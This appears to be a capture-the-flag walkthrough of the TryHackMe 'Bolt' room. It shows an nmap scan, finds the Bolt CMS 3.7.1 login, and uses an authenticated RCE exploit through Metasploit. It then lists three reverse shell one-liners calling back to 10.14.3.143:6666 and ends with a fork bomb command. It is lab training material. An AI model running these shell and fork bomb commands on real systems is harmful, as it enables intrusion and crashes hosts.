# TryHackMe-Bolt

> Abdullah Rizwan | 2:42 PM | 1st November , 2020

## NMAP

```
Nmap scan report for 10.10.241.83                                                                                                                   
Host is up (0.18s latency).                                                                                                                         
Not shown: 997 closed ports                                                                                                                         
PORT     STATE SERVICE VERSION                                                                                                                      
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                 
| ssh-hostkey:                                                                                                                                      
|   2048 f3:85:ec:54:f2:01:b1:94:40:de:42:e8:21:97:20:80 (RSA)                                                                                      
|   256 77:c7:c1:ae:31:41:21:e4:93:0e:9a:dd:0b:29:e1:ff (ECDSA)                                                                                     
|_  256 07:05:43:46:9d:b2:3e:f0:4d:69:67:e4:91:d3:d3:7f (ED25519)                                                                                   
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                               
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                        
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                 
8000/tcp open  http    (PHP 7.2.32-1)                                                                                                               
| fingerprint-strings:                                                                                                                              
|   FourOhFourRequest:                                                                                                                              
|     HTTP/1.0 404 Not Found                                                                                                                        
|     Date: Sun, 01 Nov 2020 09:48:10 GMT                                                                                                           
|     Connection: close                                                                                                                             
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1                                                                                       
|     Cache-Control: private, must-revalidate                                                                                                       
|     Date: Sun, 01 Nov 2020 09:48:10 GMT                                                                                                           
|     Content-Type: text/html; charset=UTF-8                                                                                                        
|     pragma: no-cache                                                                                                                              
|     expires: -1                                                                                                                                   
|     X-Debug-Token: 37c7d1                                                                                                                         
|     <!doctype html>                                                                                                                               
|     <html lang="en">                                                                                                                              
|     <head>                         
|     <meta charset="utf-8">         
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                                 
|     <title>Bolt | A hero is unleashed</title>                           
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">                                             
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">                                                                      
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">                                                                      
|     <meta name="generator" content="Bolt">                              
|     </head>                        
|     <body>                         
|     href="#main-content" class="vis                                     
|   GetRequest:                      
|     HTTP/1.0 200 OK                
|     Date: Sun, 01 Nov 2020 09:48:10 GMT                                 
|     Connection: close              
|     X-Powered-By: PHP/7.2.32-1+ubuntu18.04.1+deb.sury.org+1                                                                                       
|     Cache-Control: public, s-maxage=600                                 
|     Date: Sun, 01 Nov 2020 09:48:10 GMT                                 
|     Content-Type: text/html; charset=UTF-8                              
|     X-Debug-Token: 970304          
|     <!doctype html>                
|     <html lang="en-GB">            
|     <head>                         
|     <meta charset="utf-8">         
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                                        
|     <title>Bolt | A hero is unleashed</title>                           
|     <link href="https://fonts.googleapis.com/css?family=Bitter|Roboto:400,400i,700" rel="stylesheet">                                             
|     <link rel="stylesheet" href="/theme/base-2018/css/bulma.css?8ca0842ebb">                                                                      
|     <link rel="stylesheet" href="/theme/base-2018/css/theme.css?6cb66bfe9f">                                                                      
|     <meta name="generator" content="Bolt">                              
|     <link rel="canonical" href="http://0.0.0.0:8000/">                  
|     </head>                        
|_    <body class="front">           
|_http-generator: Bolt               
|_http-open-proxy: Proxy might be redirecting requests                    
|_http-title: Bolt | A hero is unleashed                                  
service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin
submit.cgi?new-service :             
SF-Port8000-TCP:V=7.80%I=7%D=11/1%Time=5F9E845A%P=x86_64-pc-linux-gnu%r(Ge                                                                          
SF:tRequest,29E1,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2001\x20Nov\x20                                                                          
SF:2020\x2009:48:10\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP                                                                          
SF:/7\.2\.32-1\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20pu                                                                          
SF:blic,\x20s-maxage=600\r\nDate:\x20Sun,\x2001\x20Nov\x202020\x2009:48:10                                                                          
SF:\x20GMT\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nX-Debug-Toke                                                                          
SF:n:\x20970304\r\n\r\n<!doctype\x20html>\n<html\x20lang=\"en-GB\">\n\x20\                                                                          
SF:x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"u                                                                          
SF:tf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20                                                                          
SF:content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x2                                                                          
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<title>Bolt\x20\|\x20A                                                                          
SF:\x20hero\x20is\x20unleashed</title>\n\x20\x20\x20\x20\x20\x20\x20\x20<l                                                                          
SF:ink\x20href=\"https://fonts\.googleapis\.com/css\?family=Bitter\|Roboto                                                                          
SF::400,400i,700\"\x20rel=\"stylesheet\">\n\x20\x20\x20\x20\x20\x20\x20\x2                                                                          
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/bulma\.css\                                                                          
SF:?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"styleshe                                                                          
SF:et\"\x20href=\"/theme/base-2018/css/theme\.css\?6cb66bfe9f\">\n\x20\x20                                                                          
SF:\x20\x20\t<meta\x20name=\"generator\"\x20content=\"Bolt\">\n\x20\x20\x2                                                                          
SF:0\x20\t<link\x20rel=\"canonical\"\x20href=\"http://0\.0\.0\.0:8000/\">\                                                                          
SF:n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body\x20class=\"front\">\n\x                                                                          
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20")%r(FourOhFourRequest,16C3,"HTTP/1                                                                          
SF:\.0\x20404\x20Not\x20Found\r\nDate:\x20Sun,\x2001\x20Nov\x202020\x2009:                                                                          
SF:48:10\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/7\.2\.32-1                                                                          
SF:\+ubuntu18\.04\.1\+deb\.sury\.org\+1\r\nCache-Control:\x20private,\x20m                                                                          
SF:ust-revalidate\r\nDate:\x20Sun,\x2001\x20Nov\x202020\x2009:48:10\x20GMT                                                                          
SF:\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\npragma:\x20no-cache                                                                          
SF:\r\nexpires:\x20-1\r\nX-Debug-Token:\x2037c7d1\r\n\r\n<!doctype\x20html                                                                          
SF:>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\                                                                          
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2                                                                          
SF:0<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial                                                                          
SF:-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2                                                                          
SF:0\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x2   
SF:x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x2                                                                          
SF:0<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial                                                                          
SF:-scale=1\.0\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2                                                                          
SF:0\x20\x20<title>Bolt\x20\|\x20A\x20hero\x20is\x20unleashed</title>\n\x2                                                                          
SF:0\x20\x20\x20\x20\x20\x20\x20<link\x20href=\"https://fonts\.googleapis\                                                                          
SF:.com/css\?family=Bitter\|Roboto:400,400i,700\"\x20rel=\"stylesheet\">\n                                                                          
SF:\x20\x20\x20\x20\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/                                                                          
SF:theme/base-2018/css/bulma\.css\?8ca0842ebb\">\n\x20\x20\x20\x20\x20\x20                                                                          
SF:\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/theme/base-2018/css/them                                                                          
SF:e\.css\?6cb66bfe9f\">\n\x20\x20\x20\x20\t<meta\x20name=\"generator\"\x2                                                                          
SF:0content=\"Bolt\">\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x                                                                          
SF:20\x20\x20\x20\x20\x20\x20\x20<a\x20href=\"#main-content\"\x20class=\"v                                                                          
SF:is");                             
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                   

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                      
Nmap done: 1 IP address (1 host up) scanned in 37.37 seconds              

```

## PORT 8000

<img src="https://imgur.com/bbNbvGj.png"/>


<img src="https://imgur.com/uozWvRg.png"/>

There exists a login page in bolt cms , I had to google that what is the page name of the login and it is `/bolt`

<img src="https://imgur.com/l55Yh4e.png"/>

Login to the cms

<img src="https://imgur.com/fsevNz4.png"/>

Here on bottom left you can bolt cms version which is `Bolt 3.7.1`


## Searchsploit 

Now search for any exploit available for `bolt cms`

<img src="https://imgur.com/uuGxZwV.png"/>

This exploit stands out perferctly because this authenticated RCE and we have the creds

## Metasploit

Let's look at metasplolit too , for that I tired using `search bolt` but no results came up ,then tried `search cms` a lot of cms exploits results came up

<img src="https://imgur.com/jUz8yl9.png"/>

So now it doesn't matter which exploit you use either metasploit or exploit-db but in this case since we are following what the rooms we are going to go with 
`metasploit`

Configure the exploit

<img src="https://imgur.com/BpPjtva.png"/>

We will have a session created 

<img src="https://imgur.com/TXRxyj9.png"/>


If you wish to have a stabilize shell , run a reverse shell command to get a stablize shell , set a listener and try one these reverse shells

```
bash -i >& /dev/tcp/10.14.3.143/6666 0>&1
nc -e /bin/sh 10.14.3.143 6666
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.3.143 6666 >/tmp/f

```

<img src="https://imgur.com/JsfpK3p.png"/>

<img src="https://imgur.com/zJjryNs.png"/>

Only the unix version of netcat reverse shell worked

<img src="https://imgur.com/VqzsMxU.png"/>

## ForkBomb

`:() { :|:& };: &`

<img src="https://imgur.com/9kInDNu.png"/>

